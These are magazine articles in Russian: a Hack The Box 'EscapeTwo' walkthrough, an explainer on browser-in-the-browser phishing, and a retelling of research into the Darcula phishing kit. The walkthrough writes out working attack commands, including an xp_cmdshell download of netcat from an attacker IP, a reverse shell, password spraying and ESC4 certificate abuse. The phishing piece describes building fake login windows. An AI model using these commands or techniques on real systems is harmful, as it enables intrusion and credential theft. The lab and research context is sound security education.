 • 135 — служба удаленного вызова процедур (Microsoft RPC);
 • 139 — служба сеансов NetBIOS, NetLogon;
 • 389 — LDAP;
 • 445 — SMB;
 • 464 — служба смены пароля Kerberos;
 • 593 (HTTP-RPC-EPMAP) — используется в службах DCOM и MS Exchange;
 • 636 — LDAP с шифрованием SSL или TLS;
 • 1433 — Microsoft SQL;
 • 3268 (LDAP) — для доступа к Global Catalog от клиента к контроллеру;
 • 3269 (LDAPS) — для доступа к Global Catalog от клиента к контроллеру
   через защищенное соединение;
 • 5985 — служба удаленного управления WinRM;
 • 9389 — веб‑службы AD DS.

Валидируем учетные данные с помощью утилиты NetExec .


nxc smb 10.10.11.51 -u rose -p KxEPkKe6R8su



                           Проверка учетных данных

Учетные данные верны, а значит, начнем собирать информацию из домена.


ТОЧКА ВХОДА

Первым делом с помощью NetExec получим список пользователей (параметр
--users ).  Иногда в описании  учетных записей можно  найти полезную
информацию.


nxc ldap 10.10.11.51 -u rose -p KxEPkKe6R8su --users





                          Список пользователей

Теперь проверим общие SMB-ресурсы (параметр --shares ).


nxc smb 10.10.11.51 -u rose -p KxEPkKe6R8su --shares





                          Список общих каталогов

Для чтения доступен недефолтный каталог Accounting Department . Подклю‐
чаемся с помощью скрипта impacket-smbclient и проверяем файлы.


smbclient.py 'sequel.htb/rose:KxEPkKe6R8su'@10.10.11.51





                            Доступные файлы

В каталоге два файла XLSX, скачиваем их на свой компьютер. Однако
при попытке открыть любую из таблиц получаем ошибку кодировки. Видимо,
файлы битые.





                      Ошибка при открытии файла

Но XLSX — это обычный ZIP, так что можем поменять им расширение и рас‐
паковать архиватором. А потом в распакованных файлах поищем строки вро‐
де secret, pass , login .



                             Результат поиска подстрок

В  папке accounts есть какие‑то пароли, поэтому открываем XML-файл
accounts/xl/sharedStrings.xml через браузер и выписываем учетные дан‐
ные.





                   Содержимое файла sharedStrings.xml

Среди найденных учеток есть sa — логин администратора Microsoft SQL.
Именно эту СУБД мы видели при сканировании портов.


ТОЧКА ОПОРЫ

Проверяем доступ к Microsoft SQL с помощью NetExec.


nxc mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --local-auth



                           Проверка учетных данных

У нас есть доступ от имени администратора базы данных, а значит, мы можем
получить сессию на хосте. Подключаемся к СУБД с помощью mssqlclient ,
входящего в Impacket, активируем процедуру enable_xp_cmdshell и для тес‐
та выполняем команду whoami.


mssqlclient.py 'squel.htb/sa:MSSQLP@ssw0rd!'@10.10.11.51


enable_xp_cmdshell
xp_cmdshell whoami





                          Результат выполнения команды

Пробросим реверс‑шелл. Для этого на своей машине запускаем листенер:


rlwrap nc -nlvp 4321

На удаленном хосте сначала скачиваем netcat, а затем подключаемся с его
помощью.


xp_cmdshell curl http://10.10.16.63:8000/nc64.exe -o C:\Windows\
Tasks\nc.exe
xp_cmdshell C:\Windows\Tasks\nc.exe 10.10.16.63 4321 -e cmd.exe





                        Выполнение реверс‑шелла

В итоге получаем сессию пользователя sql_svc .





                       Сессия пользователя sql_svc


ПРОДВИЖЕНИЕ

На диске С находим каталог с установщиком Microsoft SQL Server 2019.
В каталоге C:\SQL2019\ExpressAdv_ENU есть конфиг sql-Configuration.
INI, нужный для развертывания службы.





                  Содержимое каталога ExpressAdv_ENU





                                     Продолжение статьи                    →
                   ← НАЧАЛО СТАТЬИВЗЛОМ
     HTB ESCAPETWO
        ЗАХВАТЫВАЕМ ДОМЕН ТЕХНИКОЙ
                          ESC4 ADCS




В файле указаны учетные данные sql_svc для запуска службы.





                  Содержимое файла sql-Configuration.INI

Так как пользователи частенько задают одинаковые пароли на разных учет‐
ках, проспреим найденный пароль.


nxc smb 10.10.11.51 -u users.txt -p WqSZAF6CysDQbGb3
--continue-on-success





                        Подбор логинов к паролю

Он подходит еще к одной учетной записи — ryan . Проверим, есть ли у поль‐
зователя возможность получить сессию через WinRM.


nxc winrm 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3



                           Проверка учетных данных

Мы можем подключаться к WinRM. Получаем сессию через Evil-WinRM
и читаем первый флаг.


evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3





                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Ничего нового мы не нашли, поэтому соберем базу данных BloodHound .


Справка: BloodHound
Утилита BloodHound использует теорию графов для выявления скрытых
и зачастую непреднамеренных взаимосвязей в среде Active Directory. Ее мож‐
но использовать, чтобы легко идентифицировать очень сложные пути атаки.
Помимо самой утилиты, которая позволяет просматривать граф, существует
часть, загружаемая на удаленный хост для сбора информации. Она бывает
в версиях для Windows — на PowerShell или C# — и для Linux — на Python.



Соберем базу на удаленном хосте при помощи версии на C# — SharpHound.


SharpHound.exe -c All --domaincontroller 10.10.11.51 --ldapusername
ryan --ldappassword WqSZAF6CysDQbGb3 -d sequel.htb





                    Сбор данных BloodHound

Загружаем собранную базу в сам BloodHound и строим граф от имеющегося
у нас пользователя ryan .





                       Граф BloodHound

У нас есть путь компрометации домена, пройдемся по нему. Пользователь
ryan имеет право WriteOwner на учетную запись ca_svc. Это право позволя‐
ет установить владельца объекта. Установим ryan в качестве владельца
ca_svc с помощью утилиты bloodyAD .


bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p
WqSZAF6CysDQbGb3 set owner CA_SVC ryan



                     Назначение владельца объекта

Владелец объекта может назначать права на этот объект. Установим себе
полные права на объект с помощью скрипта impacket-dacledit .


dacledit.py  -action 'write' -rights 'FullControl' -principal 'ryan'
-target 'ca_svc' 'sequel.htb/ryan:WqSZAF6CysDQbGb3' 2>/dev/null




                           Изменение прав

Теперь, когда мы имеем полный доступ к объекту учетной записи ca_svc,
воспользуемся техникой Shadow Credentials. Она позволяет атакующему зав‐
ладеть учетной записью пользователя или компьютера, если получится изме‐
нить атрибут msDS-KeyCredentialLink целевого объекта и добавить к нему
альтернативные учетные данные, такие как сертификат. Затем по сертификату
мы получим его билет TGT, из которого извлечем NTLM-хеш пароля поль‐
зователя. Это все происходит автоматически в команде certipy shadow.
Но предварительно синхронизируем время с сервером.


sudo timedatectl set-ntp false
sudo ntpdate -s 10.10.11.51


certipy shadow auto -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3'
-account 'ca_svc' -dc-ip 10.10.11.51





                        Эксплуатация Shadow Credentials

Теперь у нас есть учетные данные ca_svc и мы можем перейти к эксплуата‐
ции уязвимости ESC4. Она заключается в том, что атакующий может изменять
свойства шаблона сертификата. Например, мы можем изменить параметры
сертификата так, чтобы он был уязвим к ESC1 — когда шаблон сертификата
разрешает проверку подлинности клиента и дает запрашивающему указать
произвольное альтернативное имя субъекта (SAN).
   Это приводит к тому, что мы можем пройти аутентификацию от имени при‐
вилегированного пользователя, включая администратора домена. Но сперва
узнаем, на какой шаблон у нас есть права.





                       Граф BloodHound

Пользователь ca_svc входит в группу CERT PUBLISHERS , которая имеет право
GenericAll  на  шаблон   сертификата  DunderMifflinAuthentication .
Модифицируем этот шаблон, а затем запросим сертификат на имя поль‐
зователя Administrator.


certipy template -u 'ca_svc@sequel.htb' -hashes :
3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -template
DunderMifflinAuthentication




                       Модификация сертификата

При запросе сертификата получим ошибку, так как DNS недоступен. Поэтому
развернем свой DNS-сервер DNSChef . Все необходимые DNS-записи
передаем через файл sequel_dns.txt.


[ A]
*.sequel.htb=10.10.11.51
[ SRV]
_ldap._tcp.pdc._msdcs.sequel.htb=0 5 389 sequel.htb
_ldap._tcp.gc._msdcs.sequel.htb=0 5 389 sequel.htb
_kerberos._tcp.dc._msdcs.sequel.htb=0 5 88 sequel.htb


python3 dnschef.py --file sequel_dns.txt

После запуска DNS-сервера обновляем запись в файле /etc/hosts .


10.10.11.51 escapetwo.htb DC01.sequel.htb sequel.htb DC01 sequel-
DC01-CA sequel-DC01-CA.sequel.htb

Теперь повторно запрашиваем сертификат. В качестве NS-сервера указыва‐
ем локальный хост.


certipy req -u 'ca_svc@sequel.htb' -hashes :
3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template
DunderMifflinAuthentication -upn Administrator@sequel.htb -target
sequel.htb -ns 127.0.0.1




                           Запрос сертификата

Теперь применяем технику UnPAC the hash. По сертификату получаем TGT
пользователя, а из него  извлекаем NTLM-хеш пароля  учетной записи
Administrator. В Certipy все действия автоматизированы.


certipy auth -pfx administrator.pfx -dc-ip 10.10.11.51





                        Учетные данные пользователя

Осталось получить сессию через Evil-WinRM и прочитать последний флаг.


evil-winrm -i 10.10.11.51 -u administrator -H
7a8d4e04986afa8ed4060f75e5a0b3ff





                           Флаг рута

Машина захвачена!
ПРИВАТНОСТЬ





Атака типа browser-in-the-browser — при‐
мер того, как относительно простые уяз‐
вимости, такие как XSS, или даже баналь‐
ные элементы вроде внешнего чата под‐
держки могут эволюционировать в серь‐         КонсультантАнтон Шустиковпо FinTech,
езную угрозу. Особенно если такие эле‐           @CakesCats_comкрипто, ИБ
менты устанавливаются без должного кон‐
троля.


Например, на странице авторизации может находиться виджет онлайн‑чата,
подключенный с внешнего ресурса. Компрометация такой библиотеки спо‐
собна предоставить злоумышленнику полный доступ к сайту — с точки зрения
выполнения кода на стороне клиента.
  О последствиях недооценки подобных рисков можно судить по случаю
из моей практики расследования. Один из обратившихся ко мне людей
однажды вечером прошел авторизацию через виджет на сайте, после чего
играл в онлайн‑казино. Уже на следующее утро он обнаружил пропажу зна‐
чительной суммы — 200 миллионов рублей. Где играл, там и проиграл...


             INFO

                        Подробнее об этом случае читай в моей предыду‐
                   щей статье — « Пасхалка в Telegram. Как я нашел
                          способ авторизоваться без клауд‑пароля и уве‐
                        домлений ».


Особенно показательной была реакция со стороны казино: их представители
полностью исключили возможность подобной атаки, хотя, как выяснилось,
логирование ошибок фронтенда не работало уже месяц, а к внешним биб‐
лиотекам они относились по принципу «Подключены и подключены, чего бух‐
теть‑то...».





BITB: ФИШИНГОВАЯ АТАКА НОВОГО УРОВНЯ

BitB (browser-in-the-browser) — это продвинутая фишинговая техника, осно‐
ванная на базовых приемах имитации интерфейса, то есть на  фейках.
Основная цель — кража пользовательских данных, ориентированная на сце‐
нарии с авторизацией через SSO и OAuth . Именно ориентация на такие
механизмы входа и выделяет BitB в отдельную категорию атак.
   Главная опасность BitB — это относительная простота ее реализации
и высокая  сложность  обнаружения  с помощью  традиционных  средств
мониторинга. Часто защита фронтенда и вопросы внешнего мониторинга
остаются вне зоны внимания команд безопасности, что создает благоприят‐
ную среду для подобных атак.


ЧТО ТАКОЕ SSO И OAUTH?

Для лучшего понимания механики атак через виджеты авторизации стоит
кратко пояснить термины:
 • SSO (Single Sign-On) — «единый вход». Технология, позволяющая поль‐
   зователю пройти аутентификацию один раз для получения доступа сразу
   к нескольким приложениям и сервисам без необходимости повторно вво‐
   дить логин и пароль;
 • OAuth — протокол авторизации, позволяющий одному сервису предос‐
   тавить другому ограниченный доступ к данным пользователя без допол‐
   нительной авторизации на последнем.

Если коротко, то это механизмы, благодаря которым пользователь может
залогиниться, не вводя логин и пароль, то есть средства центральной авто‐
ризации. Примером может быть «войти через Google» или тот самый «виджет
Telegram».


ВЕКТОРЫ РЕАЛИЗАЦИИ BITB

Для успешной атаки BitB злоумышленнику необходимо внедрить вредонос‐
ный код на страницу, которую посетит пользователь, и спровоцировать про‐
цесс авторизации. Давай пройдемся по основным вариантам реализации
такой атаки.


XSS (cross-site scripting)
Внедрение вредоносного HTML/CSS/SVG/JS на страницу через уязвимости
XSS. Реализации могут быть разные: stored (пассивные), reflected или через
prototype pollution. Атака особенно эффективна, когда код находится в самой
странице (то есть пассивный вид атаки) — все выглядит знакомо и безопас‐
но.


Компрометация легитимных сайтов
Прямое внедрение вредоносного кода в сайт. Тут тоже много разных вари‐
антов того, как может действовать злоумышленник: через уязвимости в движ‐
ке либо как‑то узнав логин и пароль от админки или самого сервера.
  В таком случае пользователь все еще находится на подлинном и привыч‐
ном ему домене, что делает атаку практически незаметной — до момента,
пока браузер не начнет показывать красную страницу с предупреждением
о том, что сайт небезопасен.


Supply chain attack (атака на цепочку поставок)
Компрометация сторонних библиотек, фреймворков и иных компонентов,
которые мы используем у себя в проектах, — разного рода подключенных
виджетов чатов поддержки или аналитики, рекламных скриптов. Все они несут
потенциальную угрозу, и внедрение кода в такую библиотеку позволяет про‐
вести атаку. Это особенно актуально, когда владельцы сайта подключают
виджеты бездумно, «насквозь» включая страницы авторизации, причем иног‐
да не только пользователей, но и админов.


Web cache poisoning (отравление кеша)
Примером может служить ситуация с фреймворком Next.js, определенные
настройки которого позволяют внедрить вредоносный код в кеш‑версию
страницы. Импакт схож с пассивным XSS, но методика внедрения и эксплу‐
атации отличается.


Что такое          prototype pollution?
Prototype pollution — уязвимость, возникающая в JavaScript-приложениях.
Она позволяет злоумышленнику изменять свойства, наследуемые всеми объ‐
ектами, что может привести к XSS, повышению привилегий, а в некоторых
случаях — даже к удаленному выполнению кода (RCE).
   Пример простейшей атаки: добавление в URL строки вроде такой:


 ?__proto__[property]=payload


Существуют  инструменты для  поиска  подобных  уязвимостей, например
ppmap.



МЕХАНИЗМ АТАКИ: ИЛЛЮЗИЯ В КОДЕ

Суть атаки BitB заключается в создании фейка — полностью поддельного,
но визуально неотличимого окна браузера внутри легитимной (или скомпро‐
метированной) веб‑страницы. Это реализуется с помощью стандартных тех‐
ник и требует от атакующего лишь незначительных навыков.


Создание поддельной страницы
Фейковую страницу можно создать, например, сохранив код существующей
страницы через функцию браузера «Скачать». Затем необходимо внести
небольшие правки в код для перехвата учетных данных. Существует множес‐
тво техник создания фейков, включая готовые панели управления и услуги
«фейк как сервис» или «фейки под ключ», доступные за весьма скромную пла‐
ту (от 3 тысяч рублей).





            Кликаем «Сохранить как» в самом обычном браузере





   За два клика получаем полную копию формы нужной нам авторизации


Имитация окна браузера
Злоумышленник создает веб‑страницу, повторяющую внешний вид окна бра‐
узера, характерный для операционной системы жертвы (Windows, macOS)
и конкретного браузера (Chrome, Safari, Firefox). Это центральный элемент
атаки.  Внутри  «нарисованного» окна  создается  элемент,  имитирующий
адресную строку, в который помещается текст URL легитимного сервиса
(например, https://oauth.telegram.org/auth... ). Рядом часто вставляет‐
ся иконка замка (SVG или изображение) для создания ложного ощущения
безопасности (HTTPS активен). Это, конечно, лишь текст или изображение,
а не реальный адрес ресурса.
   Существуют уже готовые «окна браузеров», в том числе лежат в открытом
доступе на GitHub . Достаточно скачать, изменить ссылку и задать прочие
параметры окна.
  Для повышения правдоподобия не помешает определить тип браузера
жертвы и адаптировать внешний вид окна, чтобы подделка не отличалась
от того, что привык видеть пользователь. Определение браузера с помощью
кода не составляет труда. Можно даже добавить поддержку темной цветовой
схемы, это тоже легко определяется через JavaScript:


window.matchMedia('(prefers-color-scheme: dark)').matches

В результате получается полная имитация окна браузера.





ПРИМЕР

Давай посмотрим, что можно за десять минут смастерить на нашем домене.
   Контент внутри окна интерактивный и, по сути, мало чем отличается
от нормального окна авторизации. Главное отличие — фейковое окно невоз‐
можно вывести за пределы страницы или окна реального браузера.
   Последним шагом вредоносный код вставляем на страницу: можно сде‐
лать ссылку, кнопку или показывать сразу после загрузки страницы.





                       Так выглядит конечный фейк

Вот и все, дело в шляпе! Белой, конечно же.


ВЫВОДЫ

В результате атаки пользователь видит на легитимной (или скомпромети‐
рованной) странице знакомый ему интерфейс и нажимает кнопку авториза‐
ции. Вместо реального окна появляется имитированное окошко, которое выг‐
лядит как совершенно знакомое диалоговое окно с запросом от Google,
Microsoft, Apple, Telegram или другого провайдера. Пользователь, не рас‐
познав подделку, вводит в этом окне свои учетные данные (логин, пароль
или коды двухфакторной аутентификации), которые напрямую передаются
злоумышленнику.
   Почему атака эффективна и недооценена? Во‑первых, реализация атаки
относительно проста. Создать и протестировать поддельную страницу можно
буквально за вечер.
   Во‑вторых, угрозы безопасности, связанные с фронтендом и внешним
скриптингом, вообще часто недооценивают. Современный фронтенд пред‐
ставляет собой сложную структуру, изобилующую различными библиотеками,
фреймворками и модулями. Это создает благодатную почву для разнооб‐
разных атак.
ПРИВАТНОСТЬ





Хочешь узнать, как выглядит фишинг мирового масштаба
изнутри? В этой статье мы проведем экскурсию в закулисье
одной из самых масштабных фишинговых операций пос‐
леднего времени. Покажем, как устроен этот бизнес и кто
стоит за нашумевшим проектом Darcula. По дороге под‐
робно разберем  инструменты, которые  применяли  ата‐
кующие.


             INFO

                      Это  близкий  к   тексту  пересказ  материала
                        Exposing Darcula: a rare look behind the scenes of a
                           global  Phishing-as-a-Service  operation из  блога
                         компании mnemonic . Авторы — Эрленд Лейкнес
                      и  Харрисон  Сэнд.  Этот  материал  доступен
                       без платной подписки.


Эта история началась в декабре 2023 года, когда люди по всему миру стали
получать сообщения о том, что их ждут посылки на почте. Сообщения при‐
ходили в виде SMS, iMessage или RCS-сообщений. Мы стали свидетелями
нового метода мошенничества, известного как смишинг, или SMS-фишинг.
   У таких сообщений есть общая черта: они выдают себя за бренд, которому
мы доверяем, чтобы создать правдоподобный контекст и выманить у нас лич‐
ные данные, обманом заставляя делиться информацией.
   Некоторые мошеннические схемы заметить проще, чем другие. Ошибки
в орфографии, корявые переводы, странные номера или ссылки на темные
домены часто их выдают. Но даже очевидные признаки легко упустить в суете
дня. Когда многие люди одновременно становятся мишенью, кто‑то из них
может оказаться в удачных для мошенника условиях — например, действи‐
тельно ждет посылку. И эта тактика явно работает. Если бы это не приносило
выгоды, мошенники не стали бы вкладывать столько времени, денег и усилий.





                         Фишинговое сообщение

На картинке сверху — реально полученное сообщение. Отправитель при‐
кидывается Норвежской почтовой службой, намекает, что доставка на паузе,
пока ты не накидаешь «недостающие» детали адреса. А если накидаешь, то
тебя попросят оплатить оставшуюся сумму за доставку. Конечно, бывают
реальные случаи, когда приплачивать за международные посылки действи‐
тельно нужно, но это явно не один из них.
   Пара минут гуглинга, и масштабы этой операции начали проявляться. Мы
наткнулись на кучу постов в соцсетях и новостных статей со скриншотами
подозрительно похожих сообщений, которые получали жертвы по всему миру
на разных языках.
   Любой эксперт, будь он из полиции, банка или корпорации, посоветует
в этом случае не кликать на ссылку, удалить сообщение и жить дальше спо‐
койной жизнью.
  Но наш брат не таков, нами ведь движет желание заглянуть под капот
и выяснить, как на самом деле все устроено. Именно эта жажда знаний вкупе
с нашим опытом в этичном хакерстве и безопасности приложений подтолкну‐
ла нас нарушить все разумные советы: мы решили все же кликнуть по ссылке.





Все оказалось более или менее как мы и думали. На нашем смартфоне
всплыла страничка якобы почтовой службы, предлагающая нажать на кнопку
и ввести адрес. После нескольких таких «остановок» нас попросили заплатить
небольшую сумму, что подтвердило истинную цель мошенничества — кражу
нашей кредитки.


ВЗГЛЯД ПОД КАПОТ

Только мобилки
Фишинговые сообщения, которые мы получили, были нацелены на мобиль‐
ные  устройства.  Открывать их  предполагалось именно на  смартфонах.
Но из‑за того, что смартфоны не особенно годятся для проведения форен‐
зики, нам нужно было как‑то глянуть на эту фишинговую страницу на обычном
компьютере.
   Исследуя софт, мы наткнулись на несколько антикриминалистических фун‐
кций. Первая из них — ограничение, из‑за которого ссылки открывались толь‐
ко с телефонов, работающих через сотовую сеть.
   Такие приколы часто используются для того, чтобы защитные решения,
не соответствующие этим критериям, не могли проверить ссылку на наличие
вредоносного содержимого. В итоге сообщения не помечаются как фишин‐
говые и злодейские сайты и домены не попадают в черные списки.
   Итак, при переходе по ссылке с компьютера мы столкнулись с сообщени‐
ем «Не найдено».





                     Фишинговая страница не найдена

Тогда мы решили пустить в ход знаменитый Burp. Он создает промежуточный
прокси‑сервер, который втискивается между твоим браузером и сервером,
позволяя разглядывать и редактировать трафик, пока тот носится туда‑сюда
между сервером и браузером. Чтобы наш запрос выглядел так, будто он идет
с мобильного, мы подменили заголовок User-Agent тем, что обычно переда‐
ется при открытии страницы с телефона:


User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/
537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36

Но сменить заголовок User-Agent оказалось недостаточно — мы все равно
получали ошибку «404 Not Found».
   Единственное различие между запросом, который мы посылали с телефо‐
на, и тем, что отправляли с компьютера, было в исходном IP-адресе. Видимо,
фишинговый софт был настроен так, чтобы показывать контент только тем,
кто заходит через сотовую сеть. Мы раздали себе интернет с телефона, что
наконец позволило загрузить фишинговую страницу на десктопе и с нас‐
тоящими инструментами и копнуть этот софт глубже.


Шифрование
Когда мы всё настроили и запустили, сразу стало видно, что злоумышленники
используют популярную библиотеку обмена сообщениями под названием
Socket.IO. Мы также смогли подглядеть передаваемые сообщения. Вот при‐
мер:


{


"msg": {
     "type": "824d02e7cf6ec64a44710b06ef8cfa0e",
     "data": "U2FsdGVkX19JWH3V+KnWIdPjzlF/wBhLj4W/
rYovdJmHineTSuwIxfkSQyLycrSfTyBEAai8R6yrLQnIcd3FtjqDoXPyh9j28hXEyaYAj
yo4ZuTx0jaaJE/
CdV0F/[snipped]"
  },
  "user": [],
  "room": [
     "21232f297a57a5a743894a0e4a801fc3"
  ]
}

По набору символов и длине элементов послания мы решили, что type
и room — это MD5-хеши, а data выглядит как  строка, закодированная
в Base64. Хеши обсудим чуть позже.
   После декодирования элемента данных строчка Salted_ и последующий
неразборчивый текст дали понять, что тут явно замешано шифрование.




                             Посоленный текст

В мире безопасности приложений это называется клиентским шифрованием.
И чаще всего это верный признак того, что кто‑то делает что‑то подозритель‐
ное.
  В  большинстве  случаев  шифровать  сообщения  подобным  образом
не имеет смысла. Это требует хранить ключи шифрования на клиенте, а канал
связи между клиентом и сервером и так защищен на сетевом уровне через
HTTPS. Но тут ситуация иная: приложение пытается защититься от нас —
исследователей безопасности, вооруженных прокси типа «человек посере‐
дине».
   Эта дополнительная шифровка выступает как слой обфускации, чтобы
скрыть внутренние механизмы фишингового протокола. Но поскольку у нас
был полный контроль над клиентом, мы могли просматривать сообщения
до их шифровки, и это позволило извлечь ключи шифрования.
  Мы покопались в JavaScript-коде на стороне клиента и вскоре наткнулись
на функции шифрования и дешифрования, а также на заветные ключи.





              Функция шифрования на фишинговой страничке

Мы заметили, что вирусописатели использовали библиотеку Node.js под наз‐
ванием crypto-js и алгоритм Rabbit для шифрования элемента data в сооб‐
щениях. Мы написали несколько простых строк на JavaScript, которые поз‐
волили нам расшифровывать содержимое сообщений.





                   Расшифровка фишинговой страницы

После  этого  быстрого  теста мы написали  код, который позволил нам
в режиме реального времени видеть и изменять текстовую версию сооб‐
щений в Burp. Наш код на JavaScript также показал, что ранее встреченные
параметры type и room были MD5-хешами от sync-data и admin . Теперь
у нас появилась возможность наблюдать за тем, чем занимается приложение,
и при необходимости править сообщения. Вот пример такого расшифрован‐
ного сообщения.


{
  "msg": {
     "type": "sync-data",
     "data": "{"id":1,"domain":"post.lol","ip":"192.168.100.169","ua
":"Mozilla/5.0 (iPhone; CPU iPhone OS 5\1 like Mac OS X) AppleWebKit/
534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3
","data":{},"created\at":"2024-08-30T10:07:20.907Z","updated\at":"
2024-08-30T10:07:20.907Z"}
  },
  "user": [],
  "room": [
     "admin"
  ]
}

Похоже, это что‑то вроде чата: браузер сливает данные жертвы в «комнату»
с пометкой admin.
   Вероятно, разные компоненты приложения могут подключаться к «ком‐
натам», чтобы получать сообщения. Например, если у мошенника есть панель
со списком жертв, возможно, она тоже доступна из комнаты админов.
   Копнув поглубже в эту функцию «комнат», мы наткнулись на одно любопыт‐
ное сообщение. Каждый раз, загружая фишинговую страницу, мы автомати‐
чески подключались к комнате по умолчанию.





Это сообщение подтвердило наши ранние догадки. Наш браузер, «жертва»,
подключался в пустую или стандартную комнату, но данные, которые мы вво‐
дили, улетали в комнату «админа». Нельзя ли как‑то пробраться в нее?
   То, что мы увидели, сделав это, повергло нас в шок. По экрану летел поток
имен, адресов и кредитных карт — в реальном времени мы наблюдали,
как сотни жертв попадали под фишинговую атаку. Всё, что они вводили, сим‐
вол за символом, отображалось на нашем экране.
   То, что начиналось как занимательный побочный проект, вдруг выросло
в нечто серьезное.


ГРУППА DARCULA

Когда первый шок прошел, мы поняли, что в админской комнате появляются
не только данные пострадавших. Там еще обнаружились кое‑какие техничес‐
кие логи.




На экране промелькнуло сообщение, похожее на приведенное выше. Оно
касалось ошибки в компоненте базы данных, и в нем фигурировало название
базы: Darcula.
  В тот момент это слово для нас ничего не значило — просто строка,
похожая на никнейм. Google тоже не сильно помог — оказалось, что это еще
и название попсовой цветовой схемы для текстовых редакторов, которая
просто захватила все результаты поиска.
   Примерно в это время мессенджер Telegram стал мишенью для критики
как тихая гавань для криминальных сетей. И вот там мы быстро наткнулись
на юзера и группу под названием Darcula, в которой администратором был
как раз этот самый Darcula.





Промотав фотки, выложенные в группе, мы поняли, что копаем в верном нап‐
равлении.





Тут мы наткнулись на фотографии пользователей, которые не стеснялись
делиться кадрами своих махинаций. Залежи телефонов, SIM-карт, модемов,
серверов и стойки устройств, которые они используют, чтобы засыпать жертв
спамом.





Операторы показали телефоны с подключенными карточками в Apple Pay
и платежные терминалы.
   Юзеры делились фотками, хвастались своим успехом, показывали банков‐
ские счета и роскошную жизнь, которую им позволила вести фишинговая
афера.





Члены группировки не только зарабатывали деньги, но и не стесняясь тратили
их.
  В Telegram-группе мы наткнулись на закрепленное сообщение с инструк‐
цией по установке самого фишингового софта.





Мы взяли запасной ноут и стали следовать инструкциям. Буквально через
несколько минут у нас уже была установлена копия того самого фишингового
ПО, которое использовали против нас: Magic Cat.


АКТИВИРУЕМ КОТОКОЛДУНСТВО

Запустить софтину оказалось проще простого. Копируешь одну‑единствен‐
ную команду, вставляешь ее — и вуаля, фишинговое ПО почти готово
к использованию. Если бы только не одно но — установка‑то у нас без лицен‐
зии.
  На скриншоте ниже изображена админская панель софта, который теперь
известен нам как Magic Cat. Это скрытая панель оператора, которую мошен‐
ник использует для просмотра всех украденных данных кредитных карт и вза‐
имодействия с жертвами, чтобы при необходимости запрашивать допол‐
нительные PIN-коды.





Но остается проблема с лицензией, на что скромно намекает красное сооб‐
щение внизу слева на панели управления. Придется сперва раздобыть клю‐
чик, чтобы можно было протестировать софт и запустить фишинговую кам‐
панию.
  Нам захотелось узнать, на что вообще способно это ПО, и мы начали
копаться в коде на бэкенде. Неудивительно, что тут нас ждал очередной
квест. Разумеется, код был обфусцирован до неузнаваемости.





Это был не первый случай, когда мы сталкивались с запутанным кодом
на Node.js. Мы уже знакомы с открытым инструментом с прямолинейным наз‐
ванием JavaScript Obfuscator, который берет обычный код и превращает его
в нечто, похожее на скриншот выше, — нечитабельный хлам. Но есть и другой
опенсорсный инструмент под названием synchrony, который разбирает этот
обфусцированный кошмар обратно. Получается более‑менее читабельный
код, правда, без комментариев и исходных названий функций и переменных.





Имея на руках читаемый код бэкенда, мы смогли понять, как работают разные
аспекты этого софта. К нашему удивлению, мы обнаружили функции, связан‐
ные с генерацией активационных ключей. Это не просто код для исполь‐
зования какого‑то ключа, в каждой копии фишингового софта сидел пол‐
ноценный сервер активации, который мог генерировать новые ключи. Разве
это не настоящая находка для исследователя?
   Если сервер настроен на определенное имя хоста, то открывается тайное
меню с фичей для генерации ключей активации. И это еще не всё! Он может
активировать другие копии Magic Cat.
   Чтобы активировать программу, нужно сгенерировать новую лицензию,
добавить к ней коммент, задать дату окончания срока действия и ограниче‐
ние на количество фишинговых шаблонов, которые можно скачать по этой
лицензии. По сути, все это очень напоминает типичный корпоративный софт
для управления лицензиями. Magic Cat еще и фиксировал IP-адреса всех
фишинговых серверов, откуда прилетали запросы на активацию.
   У нас все было под контролем в лабораторных условиях, так что мы смогли
обмануть наше копирайтное ПО, заставив его думать, что мы — настоящий
сервер активации. Так мы смогли активировать нашу копию Magic Cat, не пот‐
ратив ни копейки на лицензию.


                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИПРИВАТНОСТЬ
  ОХОТА НА «ДАРКУЛУ»
             ЗАГЛЯДЫВАЕМ ЗА КУЛИСЫ
              ГЛОБАЛЬНОГО ФИШИНГА





ПЛАТФОРМА MAGIC CAT

Теперь, когда софт работает на нашем ноутбуке, да еще и с доступом
к исходникам, мы можем занырнуть с головой в исследования и посмотреть,
как работает Magic Cat со стороны фишинговых операторов.
  В процессе изучения программы мы наткнулись на множество интересных
находок. Возможностей — огромное количество, и все явно задумано так,
чтобы любой покупатель, даже без технической подготовки, мог запустить
собственную фишинговую кампанию.
  На тот момент система «из коробки» включала возможность подделывать
пару сотен брендов в разных странах мира. По последним данным, обновле‐
ния платформы сделали создание кастомных шаблонов еще удобнее.





Magic Cat передает информацию, которую жертвы вводят на фишинговых
сайтах, буквально в режиме реального времени. Операторы могут отсле‐
живать каждую букву, которую вводит жертва. Они могут в любой момент зап‐
росить PIN-коды, легко подключать SMS-шлюзы и использовать множество
других функций.


ЛАЗЕЙКА?

Копаясь в коде нашего экземпляра фишингового ПО, мы заметили странную
логику, которая  проверяет,  правильный ли передан набор параметров
в HTTP-запросе. Если параметры правильные, система пропускает проверку
авторизации и можно выполнять запросы, не логинясь как фишинговый опе‐
ратор.





Такая фича у нас сразу вызвала ассоциации с бэкдором, но может, это прос‐
то разработчик накосячил? Так ли это, мы до сих пор не выяснили. Возможно,
это действительно баг — например, плохой дизайн среды разработки. Ну
а если ты готов надеть черную шляпу и включить паранойю на полную катушку,
то это может быть очень хитрый бэкдор с правдоподобным оправданием —
на случай, если кто‑нибудь его все‑таки раскопает в будущем.


К НОВЫМ ВЕРШИНАМ!

Наше  исследование  постепенно начало  показывать,  насколько  крупной
и профессиональной была эта операция. У платформы были регулярные цик‐
лы выпуска ПО, анонсы новых фич, руководства по установке и поддержка,
а также полный учет всех, кто покупал и использовал софт.
